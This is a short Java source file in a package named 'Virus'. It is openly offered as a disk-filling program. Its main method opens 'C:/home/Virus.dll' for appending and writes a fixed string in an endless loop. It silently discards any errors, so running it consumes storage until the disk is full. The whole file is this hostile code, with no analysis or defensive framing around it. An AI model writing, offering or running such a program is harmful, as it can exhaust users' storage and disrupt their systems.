/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package Virus;


import java.io.*;
class Vi
{
public static void main(String ar[])
 {
   try
  {
   FileWriter f=new FileWriter("C:/home/Virus.dll",true);

   //FileWriter f=new FileWriter("/home/anuj.txt",true);
      while(true)
   {
   f.write("Programming Is Such A FUN !!!");
   }
  }
  catch(FileNotFoundException e){}
   catch(IOException e){}
 }
} 

